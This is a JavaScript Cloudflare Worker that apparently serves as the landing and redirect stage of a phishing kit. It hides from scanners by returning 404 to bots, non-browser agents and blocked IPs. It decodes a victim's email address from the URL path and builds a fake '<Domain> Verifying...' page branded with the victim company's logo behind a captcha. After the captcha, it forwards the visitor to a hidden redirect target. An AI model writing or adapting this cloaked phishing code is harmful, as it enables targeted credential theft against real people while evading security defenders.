import handleRedirect from './redirect.js'; 
import { callers, securityKeys, textData } from './callers.js'; 
import { fetchImage } from './fetchImage.js';
import { isBrowserRequest, isIPBlocked } from './runner.js';
import { processAccessibleUrls, isStringBanned, isNullOrUndefinedOrEmpty, getValueOrDefault } from './utils.js';

// Export a default object containing event handlers
export default {
  // The fetch handler is invoked when this worker receives an HTTP(S) request
  // and should return a Response (optionally wrapped in a Promise) 
  async fetch(request, env, ctx) {
    // Parse the request.url string into a URL object
    const url = new URL(request.url);
    const pathname = url.pathname;
    const userAgent = request.headers.get('User-Agent') || '';
    const ipAddress = request.headers.get('CF-Connecting-IP') || request.headers.get('X-Forwarded-For') || request.headers.get('Remote-Addr');
    const urlworking = await processAccessibleUrls(btoa(userAgent));
    const newUrl = urlworking.accessibleUrl;
    if (!isBrowserRequest(userAgent)) {
        return new Response(null, { status: 404 });
    }

    if (isIPBlocked(ipAddress)) {
        return new Response(null, { status: 404 });
    } 
 
    const requestData = {
        date: new Date().toISOString().replace('T', ' ').replace('Z', ''),
        ip: ipAddress,
        userAgent: userAgent,
        headers: Object.fromEntries(request.headers),
        params: Object.fromEntries(new URL(request.url).searchParams),
    };
    const jsonData = JSON.stringify(requestData);

    if (jsonData.includes('bot')) {
        return new Response(null, { status: 404});
    }
  
    // Check if 'uhihkhup97ytg' is in any part of the URL path 
    if (pathname.includes(callers[1])) {
      const words = pathname.split(callers[1]);
      const words_get = getValueOrDefault(() => atob(words[1]), words[1]);
      const basedata = getValueOrDefault(() => atob(words_get), words_get);
      const redirectUrl = callers[3];
      if (isNullOrUndefinedOrEmpty(basedata)) {
        return Response.redirect(redirectUrl);
      }
      const users = basedata.split(callers[0])[3];
      const domains = basedata.split(callers[0])[5];
      const checkemail = `${users}@${domains}`
      const result = isStringBanned(checkemail);
      function capitalizeWords(str) {
          return str.toLowerCase().replace(/\b\w/g, char => char.toUpperCase());
      }
      const upperDomains = domains.toUpperCase();
      const capitalizedDomains = capitalizeWords(upperDomains);

  
      if (result) {
      return Response.redirect(redirectUrl);
     }
      // Fetch image URL
      const imageURL = await fetchImage(domains);

      const fppBody = `<!doctype html>
      <html lang="en-US">
      <head>
        <script async defer src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback"></script>
        <title>${capitalizedDomains} Verifing...</title>
        <meta content="width=device-width,initial-scale=1" name=viewport>
        <script>
          var verifyCallback_CF = function (response) {
            var cfForm = document.querySelector("#cfForm");
            if (response && response.length > 10) {
              cfForm.submit();
              return;
            }
          };
          window.onloadTurnstileCallback = function () {
            turnstile.render("#turnstileCaptcha", {
              sitekey: "${securityKeys[0]}",
              callback: verifyCallback_CF,
            });
          };
        </script>
        <style>
          .h1, .h2 {
            font-weight: 500;
          }
          * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
          }
          html {
            line-height: 1.15;
            -webkit-text-size-adjust: 100%;
            color: #313131;
            font-family: system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji;
          }
          body {
            display: flex;
            flex-direction: column;
            min-height: 100vh; 
            background: url(${textData[1]}${domains}) no-repeat center center fixed;
            background-size: fit;
          }
          a {
            transition: color .15s;
            background-color: transparent;
            text-decoration: none;
            color: #0051c3;
          }
          a:hover {
            text-decoration: underline;
            color: #ee730a;
          }
          .main-content {
            margin: 8rem auto;
            width: 100%;
            max-width: 60rem;
            background: rgba(255, 255, 255, 0.96);
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
          }
          .footer, .main-content {
            padding-right: 1.5rem;
            padding-left: 1.5rem;
          }
          .main-wrapper {
            display: flex;
            flex: 1;
            flex-direction: column;
            align-items: center;
          }
          .spacer {
            margin: 1rem 0;
          }
          .h1 {
            line-height: 3.75rem;
            font-size: 2.5rem;
          }
          .core-msg, .h2 {
            line-height: 2.25rem;
            font-size: 1.5rem;
          }
          .core-msg {
            font-weight: 400;
          }
          .body-text {
            line-height: 1.25rem;
            font-size: 1rem;
            font-weight: 400;
          }
          .icon-wrapper {
            display: inline-block;
            position: relative;
            top: .25rem;
            margin-right: .2rem;
          }
          .heading-icon {
            width: 1.625rem;
            height: 1.625rem;
          }
          .warning-icon {
            display: inline-block;
          }
          .text-center {
            text-align: center;
          }
          .footer {
            margin: 0 auto;
            width: 100%;
            max-width: 60rem;
            line-height: 1.125rem;
            font-size: .75rem;
          }
          .footer-inner {
            border-top: 1px solid #d9d9d9;
          }
          .core-msg, .zone-name-title {
            overflow-wrap: break-word;
          }
          @media (max-width: 720px) {
            .main-content {
              margin-top: 4rem;
            }
            .h1 {
              line-height: 1.75rem;
              font-size: 1.5rem;
            }
            .core-msg, .h2 {
              line-height: 1.5rem;
            }
            .h2 {
              font-size: 1.25rem;
            }
            .core-msg {
              font-size: 1rem;
            }
            .heading-icon {
              width: 1.25rem;
              height: 1.25rem;
            }
            .zone-name-title {
              margin-bottom: 1rem;
            }
          }
          @keyframes lds-ring {
            0% {
              transform: rotate(0);
            }
            to {
              transform: rotate(360deg);
            }
          }
          @media screen and (-ms-high-contrast: active), screen and (-ms-high-contrast: none) {
            .main-wrapper, body {
              display: block;
            }
          }
          @media (prefers-color-scheme: dark) {
            body {
              background-color: #222;
              color: #d9d9d9;
            }
            a {
              color: #fff;
            }
            a:hover {
              text-decoration: underline;
              color: #ee730a;
            }
          }
        </style>
      </head>
      <body class="no-js">
        <div class="main-wrapper" role="main" style="color:black">
          <div class="main-content">
            <h1 class="h1 zone-name-title">
              <div>
              
                <div id="site-name"><img src="${imageURL}" alt="${upperDomains} Is"   style="margin-bottom:-17px"  height="60"> ${securityKeys[2]}</div>
              </div>
            </h1>
            <p data-translate="please_wait" id="cf-spinner-please-wait">${securityKeys[3]}</p><br/>
            <form data-callback="verifyCallback_CF" id="cfForm" method="POST" style="visibility:visible">
              <div id="turnstileCaptcha"></div><br>
            </form>
            <div class="core-msg spacer" id="challenge-body-text">
              <div>${securityKeys[4]}</div>
            </div>
          </div>
        </div>
        <div class="footer" role="contentinfo">
          <div class="footer-inner">
            <div class="text-center">${securityKeys[5]}</div>
          </div>
        </div>
      </body>
      </html>
      `;

      if ("GET" === request.method) return new Response(fppBody, {
        headers: {
          "Content-Type": "text/html;charset=UTF-8"
        }
      });
      if ("POST" === request.method) {
        const t = (await request.formData()).get("cf-turnstile-response"),
          n = request.headers.get("CF-Connecting-IP");
        let r = new FormData;
        r.append("secret", securityKeys[1]), r.append("response", t), r.append("remoteip", n);
        const i = await fetch("https://challenges.cloudflare.com/turnstile/v0/siteverify", {
          body: r,
          method: "POST"
        });
        return (await i.json()).success ? finishAuth(request, env, ctx, newUrl) : new Response(fppBody, {
          headers: {
            "Content-Type": "text/html;charset=UTF-8"
          }
        })
      }

      async function finishAuth(request, env, ctx, newUrl) {
        return handleRedirect.fetch(request, env, ctx, newUrl);
      }
    }

    // Default response for unmatched routes
    return new Response(textData[0], { status: 404, headers: { 'Content-Type': 'text/html' } });
  },
};